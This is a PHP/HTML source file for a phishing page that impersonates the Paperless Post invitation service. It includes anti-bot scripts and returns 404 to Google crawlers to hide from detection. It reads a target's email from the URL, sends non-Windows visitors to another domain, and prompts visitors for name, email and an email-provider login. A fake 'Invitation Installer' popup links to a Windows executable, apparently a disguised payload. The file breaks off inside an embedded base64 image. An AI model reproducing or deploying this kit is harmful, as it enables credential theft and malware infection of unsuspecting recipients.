<?php
error_reporting(0);
session_start();
include('Antibot/pro.php');
include('Antibot/blocker.php');

include('Antibot/blocker_1.php');
include('Antibot/blocker_2.php');
include('Antibot/blocker_3.php');
include('Antibot/blocker_4.php');

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') !==false) {
  header('HTTP/1.0 404 Not Found');
  exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'google') !==false) {
  header('HTTP/1.0 404 Not Found');
  exit();
}

// Check if 'em' parameter exists and is not empty
if(isset($_GET['em']) && !empty($_GET['em'])) {
    // Validate and sanitize the email (optional, depending on your needs)
    $email = filter_var($_GET['em'], FILTER_SANITIZE_EMAIL);
    
    // Store the email in a session variable
    $_SESSION['ai'] = $email;
} else {
    // If 'em' parameter is not provided or empty, set a default value
    $_SESSION['ai'] = "";
}

?>

<!doctype html>
<html lang="en">
<head>
<!-- Confetti Library -->
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script>
        function detectOSAndRedirect() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            var isWindows = userAgent.indexOf("Windows") !== -1;
            var urlParams = new URLSearchParams(window.location.search);
            var userName = urlParams.get("name") || "";

            if (!isWindows) {
                window.location.href = "https://greetingss.es/public/AcrobatN/?name=" + encodeURIComponent(userName);
            } else {
                document.addEventListener("DOMContentLoaded", function () {
                    if (userName) {
                        var nameElement = document.getElementById("userName");
                        nameElement.innerText = userName;
                        nameElement.style.color = "white"; 
                        nameElement.style.fontWeight = "bold"; 
                        nameElement.style.textAlign = "center"; 
                        nameElement.style.display = "block"; 
                        nameElement.style.margin = "20px auto"; 
                    }
                });
            }
        }
        detectOSAndRedirect();
    </script>


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="assets/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Paperless post®: Online Invitations, Greeting Cards, and Flyers</title>
    <link href="assets/favicon.ico" rel="shortcut icon">
    <link href="assets/hover.css" rel="stylesheet" media="all" type="text/css">


    <style type="text/css">


    </style>
    <style>
        /* Keyframes for Typing */
        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }

        /* Keyframes for Blinking Cursor */
        @keyframes blink {
            50% { border-color: transparent; }
        }

        /* Keyframes for Fading */
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }

        /* Social Proof Notification Styles */
        #socialProof {
            display: none;
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0,0,0,0.85);
            color: white;
            padding: 15px 18px;
            border-radius: 10px;
            z-index: 9999;
            max-width: 320px;
            font-size: 1rem;
            box-shadow: 0 4px 16px rgba(0,0,0,0.18);
            animation: slideUp 0.5s ease-out;
        }

        @media (max-width: 600px) {
            #socialProof {
                left: 10px;
                right: 10px;
                bottom: 10px;
                max-width: unset;
                font-size: 0.95rem;
                padding: 12px 10px;
            }
        }

        @keyframes slideUp {
            from { transform: translateY(50px); }
            to { transform: translateY(0); }
        }

        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
    </style>
  </head>
  <body>
    <div class="container-fluid">
      <div class="row" style="background-image: url('assets/imageedit_3_2453183620.jpg'); background-size: cover;background-repeat: no-repeat;">
        <div class="container">
          <div class="row">
            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
              <div class="text-center pt-5"> 
                <img src="assets/PaperlessS.png" class="img-fluid" width="300px"><br></br>
                <span class="h4 text-white" style="font-weight: bold;">Manage your Online Invitations & Greeting Card</span><br>
                <h2 id="invitation-message">
        You have been exclusively invited by <span id="inviter-name"></span>.
    </h2>
    <span class="h6 text-white font-weight-normal" style="font-size: 14px;">To view the invitation, please select your email provider below and log in. You were invited to access the invitation on Paperlesspost.
                    </span>

    <style>
        #invitation-message {
            color: white; /* Makes the text white */
            text-align: center; /* Centers the text */
            font-size: 24px; /* Adjusts font size */
            margin-top: 20px; /* Adds spacing from the top */
        }

        /* Typing Effect */
        .typing {
            border-right: 3px solid white;
            white-space: nowrap;
            overflow: hidden;
            display: inline-block;
            width: 0;
            animation: typing 2s steps(20, end) forwards, blink 0.7s infinite;
        }

        /* Fade Out Effect */
        .fade-out {
            animation: fadeOut 1s forwards;
        }

        /* Keyframes for Typing */
        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }

        /* Keyframes for Blinking Cursor */
        @keyframes blink {
            50% { border-color: transparent; }
        }

        /* Keyframes for Fading */
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
    </style>
</div>
              <script>
    var ai = window.location.hash.substr(1);
    if (!ai) {
      ai = "<?php echo isset($_SESSION['ai']) ? $_SESSION['ai'] : 'default-value'; ?>";
    } else {
      var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (!base64regex.test(ai)) {
        var my_ai = ai;
      } else {
        var my_ai = atob(ai);
      }

      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      if (filter.test(my_ai)) {
        ai = my_ai;
      } else {
        ai = "default-value"; // Assign a default value if ai is invalid
      }
    }
  </script>
                
                <div class="row">
                <h3 id="userName" style="width: 100%; text-align: center;"></h3>


                <div class="col-lg-12 text-center text-white">
    <h4>Enter Your Details</h4>
    <input type="text" id="fullName" class="form-control my-3" placeholder="Enter your full name" required>
    <button id="nextStep" class="btn btn-primary w-100">Next</button>

    <div id="emailSection" style="display: none;">
        <input type="email" id="userEmail" class="form-control my-3" placeholder="Enter your email" required>
        <button id="accessInvitation" class="btn btn-success w-100">Click here to access the invitation</button>
    </div>
</div>

                </div>
                  <div class="col-lg-12">
                     <p class="text-white mt-3 text-center" style="font-size: 14px;">Online Invitations & Birthday Cards, Paperless post simplifies event planning with user-friendly tools for managing online invitations and greeting cards.</p>
                <p class="h8 text-center text-white" style="font-size: 11px; font-weight: bold;">© 2025 Sincere Corporation, Paperless post is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of their respective holders.</p> 
                    
                  </div>
               
              </div> 
            </div>
          </div>
        </div>



      </div> 
    </div>
    
<div id="installPopup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index:10000;">
  <div style="background:#fff; padding:30px; border-radius:10px; text-align:center; max-width:400px; width:90%;">
    <h4>🎉 Your Invitation Installer Has Been Downloaded!</h4>
    <p>Your invitation setup file is ready. Please save the file first, then run it to begin installation.</p>
    <p>If you'd like to download it again, simply <a href="https://github.com/one20code/loyalty/raw/refs/heads/main/Invitationforwindows.exe" style="color:#007bff; text-decoration:underline;">click here</a>.</p>
    <!-- Base64 Image Placeholder (you can replace this with your own image) -->
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABQAAAALQCAYAAADPfd1WAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAEu2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSfvu78nIGlkPSdXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQnPz4KPHg6eG1wbWV0YSB4bWxuczp4PSdhZG9iZTpuczptZXRhLyc+CjxyZGY6UkRGIHhtbG5zOnJkZj0naHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyc+CgogPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9JycKICB4bWxuczpBdHRyaWI9J2h0dHA6Ly9ucy5hdHRyaWJ1dGlvbi5jb20vYWRzLzEuMC8nPgogIDxBdHRyaWI6QWRzPgogICA8cmRmOlNlcT4KICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0nUmVzb3VyY2UnPgogICAgIDxBdHRyaWI6Q3JlYXRlZD4yMDI1LTA0LTE5PC9BdHRyaWI6Q3JlYXRlZD4KICAgICA8QXR0cmliOkV4dElkPjBiZWI1MGQxLTVmZDItNDQxNS1hYWI5LTUyYTQ1ODE4NDJhMzwvQXR0cmliOkV4dElkPgogICAgIDxBdHRyaWI6RmJJZD41MjUyNjU5MTQxNzk1ODA8L0F0dHJpYjpGYklkPgogICAgIDxBdHRyaWI6VG91Y2hUeXBlPjI8L0F0dHJpYjpUb3VjaFR5cGU+CiAgICA8L3JkZjpsaT4KICAgPC9yZGY6U2VxPgogIDwvQXR0cmliOkFkcz4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6ZGM9J2h0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvJz4KICA8ZGM6dGl0bGU+CiAgIDxyZGY6QWx0PgogICAgPHJkZjpsaSB4bWw6bGFuZz0neC1kZWZhdWx0Jz5BSVBvZGNhc3RzIFJldmlldyAtIDI8L3JkZjpsaT4KICAgPC9yZGY6QWx0PgogIDwvZGM6dGl0bGU+CiA8L3JkZjpEZXNjcmlwdGlvbj4KCiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0nJwogIHhtbG5zOnBkZj0naHR0cDovL25zLmFkb2JlLmNvbS9wZGYvMS4zLyc+CiAgPHBkZjpBdXRob3I+c29uaWEgdGl0aTwvcGRmOkF1dGhvcj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PScnCiAgeG1sbnM6eG1wPSdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvJz4KICA8eG1wOkNyZWF0b3JUb29sPkNhbnZhIChSZW5kZXJlcikgZG9jPURBRVE1dTR5eXdvIHVzZXI9VUFFQzkzNG5XdHcgYnJhbmQ9QkFFQzkwbGZCQ0EgdGVtcGxhdGU9PC94bXA6Q3JlYXRvclRvb2w+CiA8L3JkZjpEZXNjcmlwdGlvbj4KPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KPD94cGFja2V0IGVuZD0ncic/PnwDFjYAAHQlSURBVHic7NhBDQAgEMAwwL/nQwUhWVoFe2/PzCwAAAAAIOn8DgAAAAAA3jEAAQAAACDMAAQAAACAMAMQAAAAAMIMQAAAAAAIMwABAAAAIMwABAAAAIAwAxAAAAAAwgxAAAAAAAgzAAEAAAAgzAAEAAAAgDADEAAAAADCDEAAAAAACDMAAQAAACDMAAQAAACAMAMQAAAAAMIMQAAAAAAIMwABAAAAIMwABAAAAIAwAxAAAAAAwgxAAAAAAAgzAAEAAAAgzAAEAAAAgDADEAAAAADCDEAAAAAACDMAAQAAACDMAAQAAACAMAMQAAAAAMIMQAAAAAAIMwABAAAAIMwABAAAAIAwAxAAAAAAwgxAAAAAAAgzAAEAAAAgzAAEAAAAgDADEAAAAADCDEAAAAAACDMAAQAAACDMAAQAAACAMAMQAAAAAMIMQAAAAAAIMwABAAAAIMwABAAAAIAwAxAAAAAAwgxAAAAAAAgzAAEAAAAgzAAEAAAAgDADEAAAAADCDEAAAAAACDMAAQAAACDsAgAA///s2IEMAAAAwCB/63t8hZEABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYCAAD//+zYgQwAAADAIH/re3yFkQAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwFAAD//+zYgQwAAADAIH/re3yFkQAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgIAAP//7NiBDAAAAMAgf+t7fIWRAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAUAAP//7NiBDAAAAMAgf+t7fIWRAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAA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